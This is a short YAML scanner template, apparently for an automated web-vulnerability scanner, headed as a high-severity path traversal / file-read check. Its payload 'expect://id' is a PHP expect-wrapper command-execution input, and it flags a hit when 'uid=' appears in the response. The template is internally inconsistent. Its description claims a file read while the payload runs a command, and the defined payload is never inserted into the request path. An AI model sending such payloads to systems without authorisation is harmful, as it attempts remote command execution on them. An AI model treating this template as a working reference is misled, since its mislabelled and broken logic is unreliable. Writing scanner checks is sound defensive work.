id: lfi6-1352
name: 'Traversal in path'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via path'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - 'expect://id'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
